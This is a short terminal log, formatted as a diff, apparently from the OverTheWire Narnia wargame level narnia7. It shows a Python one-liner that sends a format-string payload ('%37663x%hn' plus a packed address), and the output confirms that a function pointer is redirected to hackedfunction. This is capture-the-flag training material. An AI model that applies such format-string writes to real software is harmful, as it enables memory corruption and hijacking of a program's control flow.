@@ -1,0 +1,10 @@
+narnia7@gibson:/narnia$ ./narnia7 $(python3 -c "import sys, struct;
+sys.stdout.buffer.write(struct.pack('<I', 0xffffd548) + b
+'%37663x%hn')")
+goodfunction() = 0x80492fa
+hackedfunction() = 0x804931f
+
+before : ptrf() = 0x80492fa (0xffffd548)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$
+
